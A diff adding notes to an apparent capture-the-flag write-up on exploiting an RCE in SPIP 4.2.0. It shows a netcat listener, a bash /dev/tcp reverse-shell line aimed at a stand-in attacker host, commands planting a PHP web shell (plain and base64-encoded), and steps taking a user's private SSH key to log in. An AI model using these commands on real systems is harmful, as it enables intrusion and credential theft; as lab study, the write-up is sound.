@@ -61,6 +61,69 @@ We got RCE vulnerability for SPIP 4.2.0
 
 ### 
 
+## Reverse Shell:
+
+Normally in SSH/FTP/TCP we connect to server
+
+In reverse shell → Server(Victim) connects to client
+
+Because firewalls in server won’t allow attackers to make incoming-session. So we trick server to have outgoin session from there to our machine.
+
+In our machine : 
+
+```bash
+nc -nvlp 1337 -> wait for anyone to connect to me on port 4444.
+```
+
+- ✅ RCE is confirmed (`system('whoami')` worked).
+- ✅ `/usr/bin/bash` exists.
+- ❌ `nc` not present.
+- ❌ `python3` not present.
+- ❌ `bash -i >& /dev/tcp/attacker/port 0>&1` did **not** connect.
+
+Current working directory is : **/home/think/spip/spip**
+
+> By below exploit with php code we created a shell.php which will give same output as exploit, but can directly access it from web like http://url/spip/shell.php/cmd=ls
+> 
+
+```php
+python print_exploit.py -u http://10.201.21.240/spip -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /home/think/spip/spip/shell.php"
+
+```
+
+But this doesn’t worked, so I tried to provide base 64 encoded php code → BOOOOOOM (worked)
+
+```python
+python print_exploit.py -u http://10.201.21.240/spip -c "echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ | base64 -d > /home/think/spip/spip/shell.php"
+
+```
+
+Tried to encode reverse shell and give, but server doesn’t allow any outbound sessions from server to other clients.
+
+**Just searched other directories where i have permission /home/think and i found user.txt**
+
+### SSH-Penetration:
+
+After cracking my head I found id_rsa in .ssh folder → ls -la /home/think → Private ssh_key
+
+Copied the content and pasted in my machine.
+
+Then tried to find the username by cat /etc/passwd, got username. 
+
+then executed ssh login code
+
+```bash
+ssh -i id_rsa think@ip
+```
+
+But I got permission error in id_rsa, so I fixed it by 
+
+```bash
+chmod 600 id_rsa
+```
+
+Now I got ssh-access after bashing my head for 6+ hours.
+
 ### Directory Enumeration:
 
 ```bash
